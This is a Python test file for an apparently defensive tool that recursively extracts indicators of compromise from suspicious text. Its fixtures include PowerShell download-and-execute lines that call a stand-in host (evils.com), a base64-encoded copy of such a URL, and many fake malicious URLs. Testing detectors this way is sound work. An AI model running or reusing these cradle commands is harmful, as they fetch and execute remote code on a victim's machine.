"""P2-05d · Recursive investigation tests."""
from __future__ import annotations

import pytest

from nivxforge.investigation.graph import EvidenceGraph, Node
from nivxforge.investigation.recursive import (
    Artifact, ArtifactQueue, InvestigatorRegistry, recursively_investigate,
    snapshot_hash, RECURSION_POLICIES,
)
from nivxforge.investigation.verdict_engine import compute_verdict


def _stub_cio():
    """Minimal CIO stub with the fields recursive.py touches."""
    g = EvidenceGraph()
    g.add_node(Node(id="A", kind="artifact", label="input", confidence=1.0))
    class _CIO:
        evidence_graph = g
        metadata = {}
        verdict = compute_verdict(g).model_dump(mode="json")
        truth = {"hypotheses": []}
    return _CIO()


def test_registry_has_day1_investigators():
    kinds = InvestigatorRegistry.kinds()
    for expected in ("command", "base64", "url", "hash", "shellcode"):
        assert expected in kinds


def test_artifact_queue_dedupes_and_caps():
    q = ArtifactQueue(max_size=3)
    assert q.push(Artifact(id="1", kind="command", content="a"))
    assert not q.push(Artifact(id="2", kind="command", content="a"))  # dedup
    assert q.push(Artifact(id="3", kind="command", content="b"))
    assert q.push(Artifact(id="4", kind="command", content="c"))
    assert not q.push(Artifact(id="5", kind="command", content="d"))  # cap
    assert q.dropped == 1


def test_snapshot_hash_stable_over_identical_state():
    cio = _stub_cio()
    h1 = snapshot_hash(cio)
    h2 = snapshot_hash(cio)
    assert h1 == h2


def test_snapshot_changes_when_node_added():
    cio = _stub_cio()
    h0 = snapshot_hash(cio)
    cio.evidence_graph.add_node(Node(id="N1", kind="ioc",
                                     label="URL", value="http://x.example/a",
                                     confidence=0.8, attrs={"ioc_kind": "url"}))
    h1 = snapshot_hash(cio)
    assert h0 != h1


def test_recursive_command_extracts_ioc_and_reaches_fixed_point():
    cio = _stub_cio()
    text = "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://evils.com/a.exe')"
    report = recursively_investigate(cio, seed_content=text, policy="small")
    assert report.iterations >= 1
    assert report.iocs_extracted >= 1
    assert report.status in ("complete", "partial")
    if report.status == "complete":
        # Six no-new flags all True
        assert all(report.reason_no_new.values())


def test_budget_exhaustion_returns_partial_never_raises():
    """Feed a payload that would generate more artifacts than the small
    policy allows — must return partial, never raise."""
    cio = _stub_cio()
    text = " ".join(f"http://mal-{i}.example/a" for i in range(50))
    report = recursively_investigate(cio, seed_content=text, policy="small")
    assert report.status in ("complete", "partial")
    # Budget was small (32 artifacts) — we should NOT hit HTTP 500 / raise.
    # Report is always populated.
    assert report.duration_ms >= 0
    assert isinstance(report.trace, list)


def test_base64_investigator_decodes_and_queues_command():
    cio = _stub_cio()
    # base64 of a URL longer than the 40-char minimum
    import base64 as b64
    long_url = "http://evils.com/a.exe?token=abcdef012345"
    text = "run this: " + b64.b64encode(long_url.encode()).decode() + " and this"
    report = recursively_investigate(cio, seed_content=text, policy="standard")
    ioc_urls = [n for n in cio.evidence_graph.nodes if n.kind == "ioc"
                and (n.attrs or {}).get("ioc_kind") == "url"]
    # The base64 blob decodes to a URL that becomes a new command → then extracts the URL.
    assert any("evils.com" in (n.value or "") for n in ioc_urls)


def test_recursion_report_attached_to_cio_metadata():
    cio = _stub_cio()
    report = recursively_investigate(cio, seed_content="hello world", policy="small")
    assert "recursion_report" in cio.metadata
    r = cio.metadata["recursion_report"]
    assert r["policy"] == "small"
    assert "reason_no_new" in r
    assert r["status"] in ("complete", "partial")


def test_recursion_is_deterministic():
    cio1 = _stub_cio()
    cio2 = _stub_cio()
    text = "IEX(New-Object Net.WebClient).DownloadString('http://evils.com/a.exe')"
    r1 = recursively_investigate(cio1, seed_content=text, policy="small")
    r2 = recursively_investigate(cio2, seed_content=text, policy="small")
    assert r1.status == r2.status
    assert r1.iterations == r2.iterations
    assert r1.iocs_extracted == r2.iocs_extracted
    assert r1.reason_no_new == r2.reason_no_new
